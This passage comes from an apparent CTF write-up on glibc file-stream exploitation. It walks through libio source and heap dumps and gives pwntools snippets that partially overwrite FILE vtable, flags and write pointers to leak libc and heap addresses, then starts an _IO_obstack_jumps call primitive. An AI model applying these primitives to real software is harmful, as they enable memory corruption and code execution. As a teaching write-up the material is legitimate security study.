<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_default_pbackfail (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt; fp-&gt;_IO_read_base &amp;&amp; !_IO_in_backup (fp)</span><br><span class="line">      &amp;&amp; (<span class="type">unsigned</span> <span class="type">char</span>) fp-&gt;_IO_read_ptr[<span class="number">-1</span>] == c)</span><br><span class="line">    --fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Need to handle a filebuf in write mode (switch to read mode). FIXME!*/</span></span><br><span class="line">      <span class="keyword">if</span> (!_IO_in_backup (fp))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* We need to keep the invariant that the main get area</span></span><br><span class="line"><span class="comment">	     logically follows the backup area.  */</span></span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt; fp-&gt;_IO_read_base &amp;&amp; _IO_have_backup (fp))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_ptr))</span><br><span class="line">		<span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (!_IO_have_backup (fp))</span><br><span class="line">	    &#123;</span><br><span class="line">        <span class="comment">// !! We should take this path cuz there is no save buffer plus we do not have the backup flag</span></span><br><span class="line">	      <span class="comment">/* No backup buffer: allocate one. */</span></span><br><span class="line">	      <span class="comment">/* Use nshort buffer, if unused? (probably not)  FIXME */</span></span><br><span class="line">	      <span class="type">int</span> backup_size = <span class="number">128</span>;</span><br><span class="line">	      <span class="type">char</span> *bbuf = (<span class="type">char</span> *) <span class="built_in">malloc</span> (backup_size);</span><br><span class="line">	      <span class="keyword">if</span> (bbuf == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> EOF;</span><br><span class="line">	      fp-&gt;_IO_save_base = bbuf;</span><br><span class="line">	      fp-&gt;_IO_save_end = fp-&gt;_IO_save_base + backup_size;</span><br><span class="line">	      fp-&gt;_IO_backup_base = fp-&gt;_IO_save_end;</span><br><span class="line">	    &#125;</span><br><span class="line">	  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_switch_to_backup_area (fp);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt;= fp-&gt;_IO_read_base)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Increase size of existing backup buffer. */</span></span><br><span class="line">	  <span class="type">size_t</span> new_size;</span><br><span class="line">	  <span class="type">size_t</span> old_size = fp-&gt;_IO_read_end - fp-&gt;_IO_read_base;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  new_size = <span class="number">2</span> * old_size;</span><br><span class="line">	  new_buf = (<span class="type">char</span> *) <span class="built_in">malloc</span> (new_size);</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">	  <span class="built_in">memcpy</span> (new_buf + (new_size - old_size), fp-&gt;_IO_read_base,</span><br><span class="line">		  old_size);</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_read_base);</span><br><span class="line">	  _IO_setg (fp, new_buf, new_buf + (new_size - old_size),</span><br><span class="line">		    new_buf + new_size);</span><br><span class="line">	  fp-&gt;_IO_backup_base = fp-&gt;_IO_read_ptr;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      *--fp-&gt;_IO_read_ptr = c;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_pbackfail)</span><br></pre></td></tr></table></figure>


<p><code>fp state after the _IO_new_file_underflow</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x559c0955e2a0: 0x00000000fbad2588      0x0000559c0956050f</span><br><span class="line">0x559c0955e2b0: 0x0000559c09560590      0x0000559c09560490</span><br><span class="line">0x559c0955e2c0: 0x0000559c0955e480      0x0000559c0955e480</span><br><span class="line">0x559c0955e2d0: 0x0000559c0955e480      0x0000559c0955e480</span><br><span class="line">0x559c0955e2e0: 0x0000559c09560480      0x0000559c0955e480</span><br><span class="line">0x559c0955e2f0: 0x0000559c09560510      0x0000559c0955e480</span><br><span class="line">0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0</span><br><span class="line">0x559c0955e310: 0x0000000000000003      0x0000000000000000</span><br><span class="line">0x559c0955e320: 0x0000000000000000      0x0000559c0955e380</span><br><span class="line">0x559c0955e330: 0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x559c0955e340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e370: 0x0000000000000000      0x00007f99db7bc460</span><br><span class="line">0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580</span><br></pre></td></tr></table></figure>

<p>Once we have the pointers at the right place, we can simply do some partial overwrites to the portion of the heap that contains a libc pointer. Indeed by taking a look at the memory at <code>fp-&gt;_IO_base_buffer &amp; ~0xff</code> (to avoid 4 bits bruteforce) we can that we can directly reach a libc pointer:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x5649e8077400: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077410: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077420: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077430: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077440: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077450: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077460: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077470: 0x00007f4092dc3f60      0x0000000000002011</span><br><span class="line">0x5649e8077480: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5649e8077490: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>Then we have to actually doing the partial overwrite by corrupting certain pointers to leak this address with the help of <code>_IO_fflush</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_fflush (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_flush_all ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> result;</span><br><span class="line">      CHECK_FILE (fp, EOF);</span><br><span class="line">      _IO_acquire_lock (fp);</span><br><span class="line">      result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">      _IO_release_lock (fp);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fflush)</span><br></pre></td></tr></table></figure>

<p>It ends up calling <code>_IO_new_file_sync(fp)</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;</span><br><span class="line">  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;</span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, delta, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos != (<span class="type">off64_t</span>) EOF)</span><br><span class="line">	fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (errno == ESPIPE)</span><br><span class="line">	; <span class="comment">/* Ignore error from unseekable devices. */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	retval = EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (retval != EOF)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Cleanup - can this be shared? */</span></span><br><span class="line">  <span class="comment">/*    setg(base(), ptr, ptr); */</span></span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)</span><br></pre></td></tr></table></figure>

<p>I already talked about the way we can gain arbitrary read with FSOP attack on <code>stdout</code> in <a href="../catastrophe">this article</a>. The way we will get a leak is almost the same, first we need to trigger the first condition in <code>_IO_new_file_sync</code> in such a way that <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> will trigger <code>_IO_do_flush(fp)</code>. Then <code>_IO_do_flush</code> triggers the classic code path I dump right below. I will not comment all of it, the only thing you have to remind is that given most of the buffers are already initialized to a valid heap address beyond the target we do not have to rewrite them, this way we will significantly reduce the amount of partial overwrite.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0							      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \</span></span><br><span class="line"><span class="meta">		  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)		      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,		      \</span></span><br><span class="line"><span class="meta">		   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr			      \</span></span><br><span class="line"><span class="meta">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure>

<p><strong>Condition</strong>:<br><code>(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</code> &gt;&#x3D; <code>sizeof(uint8_t* )</code>, <code>(_f)-&gt;_IO_write_base</code> &#x3D;&#x3D; <code>target</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (<span class="type">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Note</strong>: Given <code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code>, <code>fp-&gt;_IO_read_end</code> is the save buffer that has been allocated and switched in <code>_IO_default_pbackfail</code> and that <code>_IO_write_base</code> contains the target memory area, we have to include the <code>_IO_IS_APPENDING</code> flag into <code>fp-&gt;_flags</code> to avoid the <code>_IO_SYSSEEK</code> which would fail and then return. Therefore we can finally reach the <code>_IO_SYSWRITE</code> that will leak the libc pointer.</p>
<p>The leak phase gives for me something like this:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># do_allocate</span></span><br><span class="line">partial_write(pwn.p8(<span class="number">0xa8</span>), File.vtable)</span><br><span class="line">fflush()</span><br><span class="line"></span><br><span class="line"><span class="comment"># _IO_file_underflow =&gt; _IO_default_pbackfail</span></span><br><span class="line">partial_write(pwn.p8(<span class="number">0x60</span>), File.vtable)</span><br><span class="line">fflush()</span><br><span class="line"></span><br><span class="line">write_ptr(pwn.p64(<span class="number">0xfbad1800</span> | <span class="number">0x8000</span>), File.flags)</span><br><span class="line"></span><br><span class="line">partial_write(pwn.p8(<span class="number">0x70</span>), File._IO_write_base)</span><br><span class="line"></span><br><span class="line">partial_write(pwn.p8(<span class="number">0x78</span>), File._IO_write_ptr)</span><br><span class="line">partial_write(pwn.p8(<span class="number">0xa0</span>), File.vtable)</span><br><span class="line">write_ptr(pwn.p64(<span class="number">1</span>), File.fileno)</span><br><span class="line">fflush()</span><br><span class="line"></span><br><span class="line">leak = pwn.u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x2160c0</span> + <span class="number">0x2d160</span></span><br><span class="line">pwn.log.info(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Heap-leak"><a href="#Heap-leak" class="headerlink" title="Heap leak"></a>Heap leak</h2><p>To use the <code>_IO_obstack_jumps</code> technique, we have to craft a custom <code>obstack</code> structure on the heap (right on our filestream in fact) and thus we need to leak the heap to be able reference it. But given we already have a libc leak that’s very easy, within the <code>main_arena</code> are stored some heap pointers, which means we just have to use the same <code>_IO_fflush</code> trick to flush the filestream and then leak a heap pointer stored in the <code>main_arena</code>. I wrote a function that leaks directly the right pointer from a given address:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak_ptr</span>(<span class="params">ptr: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    We assume flags are right</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    write_ptr(ptr, File._IO_write_base)</span><br><span class="line">    </span><br><span class="line">    dest = (<span class="built_in">int</span>.from_bytes(ptr, byteorder=<span class="string">&quot;little&quot;</span>)+<span class="number">8</span>).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    write_ptr(dest, File._IO_write_ptr)</span><br><span class="line"></span><br><span class="line">    fflush()</span><br><span class="line">    ret = pwn.u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">leak_main_arena = leak + <span class="number">0x1ed5a0</span></span><br><span class="line"></span><br><span class="line">heap = leak_ptr(pwn.p64(leak_main_arena)) - <span class="number">0x2a0</span></span><br><span class="line">pwn.log.info(<span class="string">f&quot;heap: <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="obstack-exploitation"><a href="#obstack-exploitation" class="headerlink" title="obstack exploitation"></a>obstack exploitation</h2><p>As far I know, <code>obstack</code> has never been used in CTF even though it can be leveraged as a very good call primitive (and as said before it needs a heap and libc to be used). Basically, the <code>_IO_obstack_jumps</code> vtable looks like this:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">    JUMP_INIT_DUMMY,</span><br><span class="line">    JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(overflow, _IO_obstack_overflow),</span><br><span class="line">    JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(xsputn, _IO_obstack_xsputn),</span><br><span class="line">    JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">    JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>Given when <code>_IO_SYNC</code> is called in <code>_IO_fflush</code> the second argument is <code>0x1</code>, we cannot call functions like <code>_IO_obstack_xsputn</code> that need buffer as arguments, that’s the reason why we have to dig into <code>_IO_obstack_overflow</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_obstack_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make room for another character.  This might as well allocate a</span></span><br><span class="line"><span class="comment">     new chunk a memory and moves the old contents over.  */</span></span><br><span class="line">  assert (c != EOF);</span><br><span class="line">  obstack_1grow (obstack, c);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">  fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">  size = obstack_room (obstack);</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">  <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">  obstack_blank_fast (obstack, size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The <code>struct _IO_obstack_file</code> is defined as follows:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>Which means right after the <code>vtable</code> field within the file stream should be a pointer toward a <code>struct obstack</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span 